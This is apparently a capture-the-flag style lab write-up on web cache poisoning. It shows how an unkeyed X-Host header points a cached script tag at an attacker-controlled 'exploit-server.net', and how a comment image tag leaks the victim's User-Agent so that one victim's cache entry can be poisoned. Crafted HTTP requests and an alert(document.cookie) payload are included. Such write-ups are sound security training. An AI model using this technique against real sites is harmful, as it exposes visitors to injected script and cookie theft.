# Affected Component

```
GET /
```

JavaScript resource:

```
/resources/js/tracking.js
```

---

# Summary

The application accepted the undocumented `X-Host` request header and used it to generate the absolute URL of the JavaScript tracking file.

Example:

```
<script src="//example.com/resources/js/tracking.js"></script>
```

The generated response was cached.

However, because the cache key ignored the `X-Host` header, an attacker could poison the cached response and force subsequent visitors to load attacker-controlled JavaScript.

The cache also included:

```
Vary: User-Agent
```

meaning that each browser family received a different cached version. By obtaining the victim's User-Agent, it was possible to poison only the victim's cache entry.

---

# Technical Details

## 1. Hidden Header Discovery

Using Burp Suite Param Miner, an undocumented header was identified:

```
X-Host
```

This header was not documented by the application.

---

## 2. Confirming Reflection

A cache-busting parameter was added:

```
GET /?cb=1234
```

Request:

```http
GET /?cb=1234 HTTP/1.1
Host: vulnerable-site.net
X-Host: example.com
```

The response dynamically generated:

```html
<script src="//example.com/resources/js/tracking.js"></script>
```

This demonstrated that `X-Host` directly controlled the JavaScript source.

---

## 3. Preparing the Malicious Resource

On the exploit server, a malicious JavaScript file was created.

Path:

```
/resources/js/tracking.js
```

Contents:

```javascript
alert(document.cookie)
```

---

## 4. Cache Poisoning

The request was modified to reference the exploit server.

```http
GET / HTTP/1.1
Host: vulnerable-site.net
X-Host: exploit-server.net
```

The poisoned response contained:

```html
<script src="//exploit-server.net/resources/js/tracking.js"></script>
```

The cache confirmed successful storage:

```
X-Cache: hit
```

---

## 5. Cache Segmentation Analysis

The response also included:

```
Vary: User-Agent
```

This indicated that cache entries were segmented by browser.

Therefore, poisoning the cache with the attacker's User-Agent would only affect the attacker.

---

## 6. Victim Identification

A blog comment was submitted containing:

```html
<img src="https://exploit-server.net/foo">
```

When the simulated victim viewed the page, their browser requested:

```
GET /foo
```

The exploit server log revealed the victim's browser:

```
Mozilla/5.0 (Victim) AppleWebKit/537.36
(KHTML, like Gecko)
Chrome/125.0.0.0
Safari/537.36
```

---

## 7. Targeted Cache Poisoning

The malicious request was replayed using the victim's User-Agent.

```http
GET / HTTP/1.1
Host: vulnerable-site.net
X-Host: exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

After repeated requests, the cache stored the poisoned version for the victim's browser profile.

---

## 8. Victim Execution

When the victim visited the homepage, the cached HTML loaded:

```html
<script src="//exploit-server.net/resources/js/tracking.js"></script>
```

The browser executed:

```javascript
alert(document.cookie)
```

demonstrating successful JavaScript execution.

The laboratory was successfully solved.

